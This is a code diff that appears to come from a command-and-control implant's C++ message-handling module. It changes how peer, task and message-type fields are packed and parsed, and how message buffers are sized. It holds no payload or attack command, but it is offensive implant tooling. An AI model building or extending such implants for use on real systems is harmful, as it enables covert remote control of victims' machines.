@@ -96,9 +96,9 @@ namespace Message {
             Queue->MsgType  = Parser::UnpackDword(&Parser);
 
             Queue->Length   = Parser.Length;
-            Queue->Buffer   = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Queue->Buffer, Parser.Length);
+            Queue->Buffer   = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Queue->Buffer, Queue->Length);
 
-            x_memcpy(Queue->Buffer, Parser.Buffer, Parser.Length);
+            x_memcpy(Queue->Buffer, Parser.Buffer, Queue->Length);
             AddMessage(Queue);
 
             Parser::DestroyParser(&Parser);
@@ -158,11 +158,9 @@ namespace Message {
 #endif
             Stream::PackDword(Outbound, Ctx->Session.PeerId);
             Stream::PackDword(Outbound, Ctx->Session.CurrentTaskId);
-            Stream::PackDword(Outbound, TypeTasking);
+            Stream::PackByte(Outbound, TypeTasking);
 
         } else {
-            // Implants that receive messages from peers must parse the header themselves.
-            // Pid, Tid and Type need to be saved and the remaining buffer can be re-packaged with a new header
 
             Outbound = Stream::CreateStream();
             Head = Ctx->Transport.OutboundQueue;
@@ -177,7 +175,7 @@ namespace Message {
 
                     Stream::PackDword(Outbound, Head->PeerId);
                     Stream::PackDword(Outbound, Head->TaskId);
-                    Stream::PackDword(Outbound, Head->MsgType);
+                    Stream::PackByte(Outbound, Head->MsgType);
 
                     if (Ctx->Root) {
                         Stream::PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
@@ -249,13 +247,12 @@ namespace Message {
 
         PARSER Parser   = { };
         ULONG MsgType   = 0;
-        ULONG CmdId     = 0;
 
         Parser::CreateParser(&Parser, B_PTR(Inbound->Buffer), Inbound->Length);
 
         Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
         Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&Parser);
-        MsgType                     = Parser::UnpackDword(&Parser);
+        MsgType                     = Parser::UnpackByte(&Parser);
 
         switch (MsgType) {
 
@@ -265,7 +262,7 @@ namespace Message {
             }
 
             case TypeTasking: {
-                CmdId = Parser::UnpackDword(&Parser);
+                auto CmdId = Parser::UnpackByte(&Parser);
                 if (CmdId == CommandNoJob) {
                     break;
                 }
